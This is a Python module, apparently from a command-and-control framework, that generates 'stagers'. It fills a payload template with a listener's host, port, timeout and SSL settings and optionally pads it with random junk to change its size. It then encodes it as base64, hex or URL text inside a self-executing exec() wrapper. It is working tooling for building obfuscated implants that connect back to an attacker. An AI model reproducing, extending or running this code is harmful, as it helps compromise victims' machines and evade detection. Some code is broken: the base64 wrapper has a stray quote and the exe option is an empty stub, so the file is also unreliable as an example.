"""Create Stagers to download or copy"""
from binascii import hexlify
import urllib.parse
from Utils import curr, conn, json, string, random, base64


def create_stager(name: str, listener_id: int) -> any:
    """
    Create a Stager
    :name: The Name of the Stager
    :listener_id: The Listener to use
    :random_size: Randomize the size of the payload
    :delay: How long to wait before starting the Stager
    :timeout: How often the Stager should try to connect before exiting
    """

    # Check if name is already in use
    curr.execute("SELECT * FROM Stagers WHERE Name = ?", (name,))
    stager = curr.fetchone()
    if stager:
        raise Exception(f"Stager {name} already exists")

    # Save the Stager to the Database
    curr.execute(
        "INSERT INTO Stagers (Name, ListenerId) VALUES (?, ?)", (name, listener_id))
    conn.commit()
    return "Created Stager successfully!"


def get_stager(stager_id: str,
               encoder: str = "base64",
               random_size: bool = False,
               timeout: int = 5000,
               stager_format: str = "py",
               delay: int = 1,
               finished: bool = True) -> any:
    """
    Get Content of a Stager to download or copy

    :param id: The ID of the Stager
    :param encoder: The Encoder to use
    :param random_size: Randomize the size of the payload
    :param timeout: How often the Stager should try to connect before exiting
    :param format: The Format to use
    :param delay: How long to wait before starting the Stager
    :return: The Stager as a string

    """

    # Get required Data
    curr.execute("SELECT ListenerId FROM Stagers WHERE ID = ?", (stager_id,))
    stager = curr.fetchone()
    if not stager:
        raise Exception(f"Stager with ID {stager_id} does not exist")

    listener_id = stager[0]

    curr.execute("SELECT * FROM Listeners WHERE id = ?", (listener_id,))
    listener = curr.fetchone()
    if not listener:
        raise Exception("Could not find the listener")

    # Get Data from the Listener
    listener_type = listener[2]
    config = json.loads(listener[3])

    # Get Config Data
    address = config["address"]
    port = config["port"]
    ssl = True if str(config["ssl"]).lower() == "true" else False

    # Get the Payload from the File
    try:
        with open("Payloads/" + listener_type + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")

    # Randomize the Payload
    if random_size:
        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""

    # Replace the Payload
    finished_payload = start + "\n"
    finished_payload += f"import time\ntime.sleep({delay})\n"
    finished_payload += f"HOST = '{address}'\n \
        PORT = {port}\n \
        TIMEOUT = {timeout}\n \
        SSL={ssl}\n"
    finished_payload += payload + "\n" + end

    # Encode the Payload
    if not finished:
        if encoder == "base64":
            finished_payload = base64.b64encode(
                finished_payload.encode()).decode()
        elif encoder == "hex":
            finished_payload = hexlify(finished_payload.encode()).decode()
        elif encoder == "url":
            finished_payload = urllib.parse.quote(finished_payload)
        elif encoder == "raw":
            pass
        else:
            raise Exception("Encoder not supported")
    else:
        if encoder == "base64":
            finished_payload = """"import base64; \
                exec(base64.b64decode(b'%s'))""" % base64.b64encode(
                finished_payload.encode()).decode()
        elif encoder == "hex":
            finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
                finished_payload.encode()).decode()
        elif encoder == "url":
            finished_payload = """import urllib.parse; \
            exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                finished_payload)
        elif encoder == "raw":
            pass
        else:
            raise Exception("Encoder not supported")

    if stager_format == "py":
        return finished_payload
    elif stager_format == "exe":
        if not finished:
            raise Exception("Cannot create an exe from a non finished payload")
        # Create the EXE
        pass
    else:
        raise Exception("Unknown Format")
